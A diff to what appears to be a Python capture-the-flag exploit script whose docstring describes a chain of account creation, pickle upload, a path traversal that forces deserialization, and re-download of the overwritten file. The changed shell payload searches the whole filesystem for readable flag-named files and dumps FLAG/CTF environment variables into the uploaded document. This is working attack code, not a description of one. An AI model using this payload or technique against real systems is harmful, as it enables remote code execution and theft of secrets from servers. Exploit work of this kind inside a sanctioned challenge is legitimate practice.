@@ -3,9 +3,8 @@
 
 The script creates an account, uploads a pickle as a normal document, uses the
 load-plugin path traversal to deserialize it, and downloads the same document
-after the pickle payload has replaced it with the container's flag. The current
-Docker image makes /app/flag root-only, so the payload falls back to FLAG_2,
-which docker-compose exposes to the web-server process.
+after the pickle payload has replaced it with a report containing readable
+flag-named files and FLAG/CTF environment variables.
 """
 
 from __future__ import annotations
@@ -87,8 +86,20 @@ class FlagCapture:
         # Values embedded here contain only UUID hex characters generated below.
         uploaded = f"/app/storage/files/{self.login}/*__{self.basename}"
         command = (
-            f'for f in {uploaded}; do t="$f.flag"; '
-            '(cat /app/flag 2>/dev/null || printenv FLAG_2) > "$t" '
+            f'for f in {uploaded}; do t="$f.capture"; '
+            "{ printf '%s\\n' '=== READABLE FLAG FILES ==='; "
+            "find / -xdev "
+            "\\( -path /proc -o -path /sys -o -path /dev -o -path /usr \\) "
+            "-prune -o -type f "
+            "\\( -iname 'flag' -o -iname 'flag.*' -o -iname '*_flag' "
+            "-o -iname '*_flag.*' -o -iname 'ctf*' \\) "
+            "-size -1048576c -readable -print 2>/dev/null | sort -u | "
+            "while IFS= read -r p; do "
+            "printf '\\n--- FILE: %s ---\\n' \"$p\"; cat \"$p\"; "
+            "done; "
+            "printf '\\n%s\\n' '=== FLAG-LIKE ENVIRONMENT VARIABLES ==='; "
+            "printenv | grep -Ei '(^|_)(FLAG|CTF)(_|=|$)' || true; "
+            '} > "$t" '
             '&& mv "$t" "$f"; '
             "done"
         )
